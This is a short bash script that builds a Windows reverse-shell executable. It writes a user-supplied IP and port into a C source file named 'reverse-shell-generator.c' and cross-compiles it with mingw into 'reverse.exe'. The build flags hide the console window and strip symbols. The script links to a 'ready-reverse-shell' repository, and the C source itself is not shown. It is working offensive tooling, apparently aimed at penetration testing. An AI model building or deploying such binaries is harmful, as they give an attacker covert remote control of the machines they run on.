#!/usr/bin/env bash
set -euo pipefail

fileCode="reverse-shell-generator.c"  

usage() {
  echo "sudo apt update && sudo apt install mingw-w64 -y"
  exit 1
}

if [ $# -lt 2 ]; then
cat <<EOF

Make sure the requirements are installed first:
   sudo apt update && sudo apt install mingw-w64 -y
Usage:
   $0 <IP> <PORT>
Example:
   $0 192.168.8.10 5555
The output:
   reverse.exe  
EOF
exit 1
fi

trap 'echo "Error occured!" >&2' ERR

sed -i 's/^#define TARGET_IP ".*"/#define TARGET_IP "'"$1"'"/' "$fileCode"
sed -i 's/^#define TARGET_PORT .*/#define TARGET_PORT '"$2"'/' "$fileCode"

x86_64-w64-mingw32-gcc "$fileCode" -o reverse.exe -O2 -s -Wl,-subsystem,windows -lws2_32

echo "Done: reverse.exe built for IP=$1, PORT=$2"
echo "https://github.com/kaledaljebur/ready-reverse-shell"
